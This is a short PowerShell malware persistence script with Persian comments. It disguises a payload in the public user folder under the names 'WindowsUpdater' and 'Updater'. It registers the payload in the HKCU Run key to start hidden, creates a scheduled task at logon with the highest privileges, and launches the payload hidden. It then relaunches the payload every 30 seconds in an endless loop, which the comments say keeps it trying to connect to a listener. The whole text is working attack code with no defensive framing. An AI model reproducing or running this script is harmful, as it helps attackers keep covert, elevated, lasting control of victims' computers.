$payloadPath = "C:\Users\Public\updater.exe"
$taskName = "WindowsUpdater"

# اضافه کردن به استارت‌آپ در رجیستری
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Updater" /t REG_SZ /d "powershell -w hidden -c Start-Process '$payloadPath'" /f

# ایجاد Scheduled Task برای اجرای پیلود بعد از ری‌استارت
schtasks /create /sc onlogon /tn $taskName /tr "$payloadPath" /f /rl highest

# اجرای اولیه پیلود
Start-Process -FilePath $payloadPath -WindowStyle Hidden

# ایجاد Loop برای تلاش مداوم در اتصال به لیسنر
while ($true) {
    Start-Process -FilePath $payloadPath -WindowStyle Hidden
    Start-Sleep -Seconds 30
}
